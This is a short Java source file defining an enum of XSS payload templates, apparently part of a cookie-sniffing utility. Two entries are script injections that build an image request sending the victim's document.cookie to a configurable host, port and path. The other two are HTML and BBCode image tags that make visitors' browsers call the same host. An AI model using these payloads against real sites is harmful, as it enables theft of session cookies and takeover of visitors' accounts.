package com.github.eljah.utils;

/**
 * Created by Ilya Evlampiev on 21.06.15.
 * List of prepared templated injection text according to https://hpc.name/sniffer/
 *
 */
public enum XSSTypes {
    JAVSCRIPT_IMG_TAG("<script> img = new Image(); img.src = \"http://%1$s:%2$d/%3$s?\"+document.cookie; </script>"),
    JAVASCRIPY_IMG_ADDRESS("javascript:document.write('<script>img = new Image(); img.src = \"http://%1$s:%2$d/%3$s?\"+document.cookie;</script>')"),
    HTML_IMG("<img src=\"http://%1$s:%2$d/%3$s\">"),
    BBCODE_IMG("[img]http://%1$s:%2$d/%3$s[/img]\n"),
    ;

    private final String text;

    /**
     * @param text
     */
    private XSSTypes(final String text) {
        this.text = text;
    }

    /* (non-Javadoc)
     * @see java.lang.Enum#toString()
     */
    @Override
    public String toString() {
        return text;
    }


}
